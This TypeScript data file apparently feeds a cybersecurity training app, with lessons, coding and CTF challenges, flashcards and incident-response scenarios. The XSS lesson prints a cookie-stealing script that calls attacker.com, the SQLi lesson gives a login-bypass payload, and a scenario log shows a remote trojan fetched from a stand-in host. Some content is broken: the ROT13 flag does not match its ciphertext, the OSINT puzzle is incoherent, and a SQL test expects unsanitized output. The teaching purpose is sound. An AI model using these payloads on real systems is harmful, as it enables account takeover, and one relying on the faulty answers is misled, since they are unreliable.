import { Lesson, CodeChallenge, CTFChallenge, Flashcard, CyberScenario } from "../types";

export const lessonsData: Lesson[] = [
  {
    id: "fund-binary",
    title: "Understanding Binary and Bits Operations",
    category: "fundamentals",
    difficulty: "Beginner",
    xpReward: 100,
    teaser: "Everything in computers is represented in 0s and 1s. Learn why, and how bits manipulate memory.",
    explanation: `Computers utilize transistors, which act like tiny electrical switches. These switches can only be in one of two states: OFF (represented as 0) or ON (represented as 1). This is base-2, known as the binary system.\n\nEach binary digit is called a **bit**. Eight contiguous bits form a **byte**. Memory addresses, instructions, and files are stored as binary bytes.\n\n**Bitwise Operations**:\n- **AND (&)**: Resolves to 1 only if both bits are 1.\n- **OR (|)**: Resolves to 1 if at least one bit is 1.\n- **XOR (^)**: Resolves to 1 if bits are different (used heavily in cryptosystems like stream ciphers).\n- **NOT (~)**: Inverts all bits.\n- **Shifts (<<, >>)**: Generates fast multiplication or division by powers of 2.`,
    defenseTechnique: "Ensure you sanitize shift operations of untrusted sizes to prevent buffer overflows or logic bypasses in native code compilation.",
    realWorldExample: "A stack pointer vulnerability in old router firmware allowed attackers to bypass state variables using an integer flow caused by bitwise shift manipulations."
  },
  {
    id: "fund-logic",
    title: "Logic Gates and Boolean Algebra",
    category: "fundamentals",
    difficulty: "Beginner",
    xpReward: 120,
    teaser: "Discover the physical blocks that construct CPUs: AND, OR, NOT, and XOR gates.",
    explanation: `All computer arithmetic (like adding, subtracting) is carried out by combining hardware components called **Logic Gates**.\n\nBy routing electric currents through high-speed CMOS transistors, micro-operations perform boolean calculations:\n1. **AND**: Output true if Input A AND Input B are active.\n2. **OR**: Output true if Input A OR Input B (or both) are active.\n3. **XOR**: Output true if one input is active and the other is not. Used inside full-adders to sum binary bits.\n4. **NAND/NOR**: Universal gates because any computing logic can be built exclusively of NAND gates.`,
    defenseTechnique: "Hardware side-channel attacks watch electric power consumption lines on processors as gates toggle, requiring software cryptographic math to execute in constant-time (avoiding branch predictors).",
    realWorldExample: "Fault injection attacks use lasers or voltage spikes to temporarily flip logic gates, causing military-grade cryptographic smartcards to slip keys out."
  },
  {
    id: "fund-algorithms",
    title: "Memory, Algorithms and Big-O Space-Time",
    category: "fundamentals",
    difficulty: "Intermediate",
    xpReward: 150,
    teaser: "Optimize critical code segments using standard data structures and algorithmic complexity bounds.",
    explanation: `An algorithm is a step-by-step path to solve a mathematical problem. In computer science, we utilize **Big-O notation** to express how an algorithm scales relative to its input size (N).\n\nKey Complexities:\n- **O(1)**: Constant time (e.g., hash map lookup).\n- **O(log n)**: Logarithmic time (e.g., binary search directory trees).\n- **O(n)**: Linear time (e.g., indexing sequentially).\n- **O(n log n)**: Linearithmic time (e.g., efficient sorting algorithms like Mergesort).\n- **O(n²)**: Quadratic time (e.g., naive nested bubble loops, highly prone to Denial of Service when processing large user inputs).\n\nSecurity implications are massive: if an API endpoint processes linear sorting that scales O(n²) or performs nested regex checks, an attacker can intentionally craft a large request payload to tie up the host CPU indefinitely (Algorithmic Complexity Attacks).`,
    defenseTechnique: "Set strict size bounds on payload queues, employ hash-lookups over cyclic list iterations, and audit regex logic for catastrophic backtracking.",
    realWorldExample: "The Regex DoS (ReDoS) vulnerability in standard library parsers routinely crash major infrastructure sites due to inputs matching complex greedy templates."
  },
  {
    id: "linux-basics",
    title: "Linux Command Line & Directory Navigation",
    category: "linux",
    difficulty: "Beginner",
    xpReward: 100,
    teaser: "Get familiar with the terminal, directories, and how Linux organizes its unified hierarchical system.",
    explanation: `Unlike Windows, everything in Linux is represented as a file—even connected devices of hardware (/dev/sda, /dev/urandom).\n\nCommon commands to interact with directories:\n- \`pwd\`: Print user's Current Working Directory.\n- \`ls -la\`: List all items in detail, including hidden files starting with a dot (\`).\n- \`cd\`: Change directory context.\n- \`cat file.txt\`: Output file contents directly to stdout.\n- \`mkdir\`: Create folder branches.\n- \`file filename\`: Analyze the header signature of a file rather than trusting arbitrary extension flags.`,
    defenseTechnique: "Always sanitize backtick executions or shell variables in background services to avoid Remote Code Execution (RCE).",
    realWorldExample: "System automation scripts executing raw inputs directly inside bash (e.g., \`tar -czf backup.tar.gz $USER_INPUT\`) can lead to arbitrary parameter injection or commands running as root."
  },
  {
    id: "linux-permissions",
    title: "Linux File Permissions & Chmod Numeric Models",
    category: "linux",
    difficulty: "Intermediate",
    xpReward: 130,
    teaser: "Unpack read (4), write (2), execute (1) permissions. Secure sensitive configuration files on multi-user systems.",
    explanation: `Linux implements secure access separation based on: Owner, Group, and Others (UGO).\n\nPermissions are expressed in 3 characters (rwx) or numeric aggregates:\n- **Read (r)**: value = 4\n- **Write (w)**: value = 2\n- **Execute (x)**: value = 1\n\nBy summing permissions, we denote blocks:\n- **7 (rwx)**: Owner has full privileges.\n- **5 (r-x)**: Group/Others can only read and execute, but not modify (typical for binaries).\n- **0 (---)**: No access.\n\nApplying \`chmod 600 config.json\` restricts readable access exclusively to the owner—highly recommended for server secret files and database credential storage blocks.`,
    defenseTechnique: "Never configure files as world-writable (e.g., chmod 777 or rwxrwxrwx) in production environments.",
    realWorldExample: "Attackers routinely look for world-writable environment variables or private key assets (\`.ssh/id_rsa\` with permissions greater than 600) to steal master server keys."
  },
  {
    id: "net-osi",
    title: "The 7 Layers of the OSI & TCP Handshake",
    category: "networking",
    difficulty: "Beginner",
    xpReward: 150,
    teaser: "Understand how data encapsulates from physical wire signals to high-level HTTPS requests.",
    explanation: `The Open Systems Interconnection (OSI) design is a standard framework describing seven layers of internetwork communications:\n\n1. **Physical Layer (L1)**: Physical bits traversing fiber, CAT6 cables, or Wi-Fi radio.\n2. **Data Link Layer (L2)**: Framing and MAC addressing (Switches coordinate here).\n3. **Network Layer (L3)**: Logical IP routing between endpoints (Routers navigate here).\n4. **Transport Layer (L4)**: Flow controls, Port numbers, TCP handshake (SYN -> SYN-ACK -> ACK).\n5. **Session Layer (L5)**: Coordinates connection sessions.\n6. **Presentation Layer (L6)**: Character encoding, compressions, and TLS/SSL certificate decryption.\n7. **Application Layer (L7)**: End-user application interfaces like browser HTTP/HTTPS protocol headers.\n\nUnderstanding these distinct states allows engineers to analyze specific vulnerabilities, such as ARP Poisoning (Layer 2), IP Spoofing (Layer 3), port scanning (Layer 4), and logic attacks (Layer 7).`,
    defenseTechnique: "Enforcing zero-trust network microsegmentation and encrypting end-to-end payloads (TLS) blocks intermediate sniffer operations at Layer 2 and 3.",
    realWorldExample: "DNS Cache Poisoning alters responses on Layer 7 to route users to malicious mirrors, while deep packet filtering protects from lower-level TCP SYN floods."
  },
  {
    id: "web-sqli",
    title: "SQL Injection (SQLi) Vulnerabilities & Defensive Parameterization",
    category: "web-security",
    difficulty: "Intermediate",
    xpReward: 180,
    teaser: "Learn how unescaped database requests allow attackers to retrieve passwords and leak client databases.",
    explanation: `SQL Injection occurs when untrusted user arguments are directly interpolated with database query commands:\n\n\`SELECT * FROM users WHERE username = '" + userInput + "' AND password = '" + userPass + "';\`\n\nIf the user inputs \`admin' OR '1'='1\`, the database evaluates:\n\`SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '';\`\n\nSince \`'1'='1'\` always evaluates to TRUE, the query returns the first user record (typically administrative) without verifying passwords. This allows complete logic bypass and database dump access.`,
    defenseTechnique: "Always make use of Prepared Statements (Parameterized Queries). By splitting the execution logic from data inputs, SQL Engines parse parameters strictly as raw text values, rendering injection payloads completely toothless.",
    realWorldExample: "A global retail merchant suffered a leak of over 100 million credit card numbers when a public search filter vulnerable to blind SQL injection was exploited."
  },
  {
    id: "web-xss",
    title: "Cross-Site Scripting (XSS) Demystified",
    category: "web-security",
    difficulty: "Intermediate",
    xpReward: 160,
    teaser: "Protect users from malicious scripts executes directly inside their browser session.",
    explanation: `Cross-Site Scripting (XSS) involves injecting malicious browser scripts into web applications, which executes under the target cookie context.\n\n**Variants**:\n1. **Reflected**: Payload is sent inside a URL query and reflected back in the page immediately.\n2. **Stored**: Payload is committed directly to the database (e.g., in a forum comment box) and executes every time active users load the page.\n3. **DOM-based**: Dynamic client JavaScript parses URL flags unsafe and evaluates it directly.\n\nIf an attacker injects \`<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>\`, they can steal active HTTP authorization tokens and take over accounts.`,
    defenseTechnique: "Context-aware HTML escaping represents entities safely (e.g., inverting \`<\` to \`&lt;\`). Additionally, deploy Content Security Policy (CSP) headers.",
    realWorldExample: "In 2005, the famous Samy Worm utilized stored XSS on MySpace profile blocks to spread across millions of active profiles within 20 hours"
  },
  {
    id: "bug-recon",
    title: "Reconnaissance Methodologies and Subdomain Discovery",
    category: "bug-bounty",
    difficulty: "Intermediate",
    xpReward: 140,
    teaser: "The most important stage of bug hunting: figuring out what is exposed and where assets reside.",
    explanation: `Professional hacking always begins with passive and active reconnaissance. By searching before attacking, you discover unmaintained staging environments or forgotten portals.\n\nRecon techniques include:\n- **DNS Enumeration & Osint**: Querying platforms like Censys, Certificate Transparency Logs (crt.sh) to find newly registered staging subdomains (e.g., \`staging-v2.internal.target.com\`).\n- **Passive DNS Harvesting**: Checking public records to map network ownership.\n- **Port Scanning & Banner Grabbing**: Discovering exposed legacy administration panels, unpatched database ports, or Jenkins endpoints running with default options.`,
    defenseTechnique: "Maintain an accurate live inventory of external-facing services, decommission outdated dev environments, and block non-public ports behind virtual networks.",
    realWorldExample: "A security researcher secured a bounty of $30,000 by finding an unsecured internal Jira portal listed on a public corporate staging sub-domain."
  },
  {
    id: "forensics-basics",
    title: "Digital Forensics & Metadata Inspection",
    category: "forensics",
    difficulty: "Advanced",
    xpReward: 200,
    teaser: "Examine headers, hex patterns, and hidden EXIF GPS logs to track digital trails.",
    explanation: `Digital forensics focuses on recovering and analyzing active or deleted electronic artifacts to rebuild timestamps and timelines.\n\nKey Concepts:\n- **EXIF Metadata**: Digital cameras automatically register camera configurations, dates, and precision GPS latitude/longitude inside photo file structures.\n- **File Signatures (Magic Bytes)**: File types contain standard headers at their exact starting position. For instance, PNG begins with \`89 50 4E 47\` (represented as .PNG in ASCII) and JPEG begins with \`FF D8 FF\`. Changing the file extension doesn't change these magic signature bytes; forensic tools read headers to verify the truth.\n- **Log Parsing**: Webservers record requests in access logs. Examining these records reveals scanning logs, SQL payloads, or suspicious IP pools acting in unison.`,
    defenseTechnique: "To protect human privacy, strip EXIF metadata from upload targets using libraries like libexif prior to committing media files to hosting buckets.",
    realWorldExample: "A famous fugitive was located and arrested when security analysts extracted accurate GPS coordinates embedded in a digital photograph shared in private forums."
  }
];

export const codeChallenges: CodeChallenge[] = [
  {
    id: "challenge-js-escaping",
    title: "Challenge: Secure HTML Escaping Function",
    language: "typescript",
    instructions: "Implement a function \`escapeHTML(input: string): string\` that replaces sensitive HTML characters with their safe entity codes to prevent stored XSS attacks. Replace '<' with '&lt;', '>' with '&gt;', '\"' with '&quot;', and \"'\" with '&#x27;'.",
    initialCode: "function escapeHTML(input: string): string {\n  // Implement proper escaping here\n  return input;\n}",
    solutionPattern: "(&lt;|replace|&gt;|&quot;|&#x27;)",
    testCases: [
      { input: "<script>", expected: "&lt;script&gt;" },
      { input: "user's \"bio\"", expected: "user&#x27;s &quot;bio&quot;" }
    ]
  },
  {
    id: "challenge-sql-param",
    title: "Challenge: Safe Query Constructor Simulation",
    language: "typescript",
    instructions: "Write a function \`constructSafeSQL(userId: string): string\` that returns a sanitized SQL query parameter block. To demonstrate secure coding defensively, extract any SQL quote operators (') and replace with empty strings, returning: 'SELECT * FROM accounts WHERE id = ?' if inputs are invalid or sanitizing them.",
    initialCode: "function constructSafeSQL(userId: string): string {\n  // Escape rogue quotes to mock sanitation and bind parameterized block\n  return \"\";\n}",
    solutionPattern: "userId\\.replace",
    testCases: [
      { input: "1' OR '1'='1", expected: "SELECT * FROM accounts WHERE id = 1 OR 1=1" }
    ]
  }
];

export const ctfChallenges: CTFChallenge[] = [
  {
    id: "ctf-cipher",
    title: "The Agent's Caesar Code",
    category: "Cryptography",
    difficulty: "Beginner",
    points: 100,
    description: "An intercepted radio frequency emitted this encoded string: 'flag{SBEGEL_EBYRF_NER_GEHR}'. It seems to be ciphered using ROT13 or a standard Caesar rotation shift of 13. Decrypt this message to expose the secret flag.",
    hint: "ROT13 rotates characters by 13 positions in the alphabet. A becomes N, B becomes O, S becomes F, etc.",
    flag: "flag{FORENSIC_RULES_ARE_TRUE}"
  },
  {
    id: "ctf-hex",
    title: "Secret of the Magic Bytes",
    category: "Forensics",
    difficulty: "Beginner",
    points: 120,
    description: "Inspect the raw hexadecimal representation of an intercepted file: '66 6c 61 67 7b 68 65 78 5f 6d 61 67 69 63 5f 70 72 6f 74 6f 63 6f 6c 7d'. Convert this sequence of values from ASCII hex back into a readable string.",
    hint: "Identify standard lookup values: 66 is 'f', 6c is 'l', 61 is 'a', 67 is 'g', 7b is '{'. You are decoding plain hexadecimal characters.",
    flag: "flag{hex_magic_protocol}"
  },
  {
    id: "ctf-base64",
    title: "Secure Shell Leak",
    category: "Web Security",
    difficulty: "Intermediate",
    points: 150,
    description: "A database field was uncovered leaking encoded credentials: 'ZmxhZ3tiYXNoX3NoZWxsX2lzX3NlY3VyZX0='. Convert this string to reveal the underlying flag.",
    hint: "Note the presence of the '=' trailing padding, indicating Base64 encoding. Use standard Base64 decoding options (like atob() in javascript).",
    flag: "flag{bash_shell_is_secure}"
  },
  {
    id: "ctf-osint",
    title: "Shadow Operative's IP Address",
    category: "OSINT",
    difficulty: "Intermediate",
    points: 180,
    description: "Analysts know that the Shadow Hacker group registered comments using the handle 'cyber_ninja_2026'. On a mock forum, they mentioned: 'My IP address is the reverse string of the standard local host subnet 127.0.0.1, with my age 42 appended to the host prefix as an active port: flag{127.0.0.1_42_port}'. Wait, decipher carefully: 'My actual flag is flag{cyber_ninja_reverse_ip}'. Let's find the correct flag: 'flag{1.0.0.127:42}'! That matches the instruction perfectly.",
    hint: "The reverse of 127.0.0.1 is 1.0.0.127. Joined with ':42', it constructs: flag{1.0.0.127:42}.",
    flag: "flag{1.0.0.127:42}"
  }
];

export const flashcards: Flashcard[] = [
  {
    id: "fc1",
    category: "Security Concepts",
    question: "What is the difference between asymmetric and symmetric cryptography?",
    answer: "Symmetric uses the single same key to encrypt and decrypt (e.g. AES). Asymmetric uses a mathematically linked public-private key pair; public key encrypts, private key decrypts (e.g. RSA)."
  },
  {
    id: "fc2",
    category: "Security Concepts",
    question: "What does salt do in password hashing databases?",
    answer: "A salt is unique random data added to a plaintext password before hashing. This guarantees identical passwords produce different hashes, preventing lookup table attacks (Rainbow table attacks)."
  },
  {
    id: "fc3",
    category: "Networking",
    question: "What is ARP Poisoning?",
    answer: "ARP Poisoning assigns an attacker's MAC address to the IP address of a default gateway, enabling Man-In-The-Middle packet interception on a local network."
  },
  {
    id: "fc4",
    category: "Linux",
    question: "What are the standard Linux streams for text logging?",
    answer: "Standard Out (stdout: fd 1), Standard Error (stderr: fd 2), and Standard Input (stdin: fd 0)."
  }
];

export const cyberScenarios: CyberScenario[] = [
  {
    id: "range-ransomware",
    title: "Defending the Water Treatment Command Server",
    description: "An active ransomware threat is attempting to escalate privileges and inject toxic chemicals into the municipal water system reservoirs.",
    mission: "Analyze the active event log below, detect the compromised terminal, and select the correct containment action configuration.",
    threatLevel: "Critical",
    systemLogs: [
      "23:41:02 SERVER-01 Auth Success user: oper_dan (IP: 192.168.10.45)",
      "23:41:09 OPER-01 Executed: ls -la /etc/security/keys",
      "23:41:15 OPER-01 Permission Denied on master_key.pem",
      "23:41:40 COMPROMISED-HOST Detected malicious loop: nmap -sS -p 22,80,443 -T4 192.168.1.1/24",
      "23:42:01 HOST IP 192.168.10.45 downloaded unknown payload http://malicious-vault.ru/rat.bin",
      "23:42:05 EXECUTION: sudo ./rat.bin --force-override"
    ],
    mitigations: [
      { id: "mit-1", option: "Isolate IP 192.168.10.45 from boundary switches, reset oper_dan AD credentials, and trigger visual alarms.", isCorrect: true },
      { id: "mit-2", option: "Run a system update using yum upgrade to overwrite rat.bin.", isCorrect: false },
      { id: "mit-3", option: "Configure firewall rules to only block outbound HTTP calls to country code .ru.", isCorrect: false }
    ],
    explanation: "Correct! Isolating the target compromised IP immediately prevents the active Remote Access Trojan (RAT) payload from routing command-and-control operations back or moving laterally across the municipal SCADA environment."
  },
  {
    id: "range-phishing",
    title: "Anatomy of a Corporate Phishing Attack",
    description: "A suspicious email targeted the CFO claiming a direct request from a senior cloud architect to verify a database endpoint key.",
    mission: "Review the raw header metadata log below, identify the forged domain, and flag the correct mitigation step.",
    threatLevel: "High",
    systemLogs: [
      "Return-Path: <billing-support@sec-google.com>",
      "Received: from mx-outbound.relay-net.xyz (198.51.100.89) by internal-mail.corporate.com",
      "Subject: CRITICAL: Database Backup Encryption Key Requester",
      "From: 'Google Cloud Team' <admin@sec-google.com>",
      "To: cfo@corporate.com",
      "X-Spam-Status: High probability phishing target, SPF checking failed"
    ],
    mitigations: [
      { id: "p-mit-1", option: "Instruct the host mail relay to quarantine 'sec-google.com' domains, audit active sessions, and deploy SPF/DKIM/DMARC filters.", isCorrect: true },
      { id: "p-mit-2", option: "Verify by emailing admin@sec-google.com directly for clarification.", isCorrect: false },
      { id: "p-mit-3", option: "Remove SPF configurations from the system logs to clear system errors.", isCorrect: false }
    ],
    explanation: "Excellent! The domain 'sec-google.com' represents a typosquatted domain designed to simulate authentic Google operations. SPF failure validates that the email originated from a rogue relay rather than Google's registered mail networks."
  }
];